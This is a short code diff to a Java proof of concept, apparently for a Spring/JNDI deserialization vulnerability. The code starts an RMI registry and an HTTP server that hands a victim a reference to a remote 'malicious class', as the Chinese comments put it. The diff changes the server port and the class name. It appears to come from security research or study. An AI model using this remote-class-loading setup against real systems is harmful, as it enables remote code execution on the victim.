@@ -21,7 +21,7 @@ public class SpringPOC {
      */
     public static void lanuchCodebaseURLServer() throws IOException {
         System.out.println("Starting HTTP server");
-        HttpServer httpServer = HttpServer.create(new InetSocketAddress(8000), 0);
+        HttpServer httpServer = HttpServer.create(new InetSocketAddress(8001), 0);
         httpServer.createContext("/", new HttpFileHandler());
         httpServer.setExecutor(null);
         httpServer.start();
@@ -35,8 +35,8 @@ public class SpringPOC {
         System.out.println("Creating RMI Registry");
         Registry registry = LocateRegistry.createRegistry(1999);
         // 设置code url 这里即为http://http://127.0.0.1:8000/
-        // 最终下载恶意类的地址为http://127.0.0.1:8000/ExportObject.class
-        Reference reference = new Reference("ExportObject", "ExportObject", "http://127.0.0.1:8000/");
+        // 最终下载恶意类的地址为http://127.0.0.1:8000/com.github.ruanshengwei.javalang.serialization.deserialization.bug.ExportObject.class
+        Reference reference = new Reference("com.github.ruanshengwei.javalang.serialization.deserialization.bug.ExportObject", "com.github.ruanshengwei.javalang.serialization.deserialization.bug.ExportObject", "http://127.0.0.1:8001/");
         // Reference包装类
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
         registry.bind("Object", referenceWrapper);
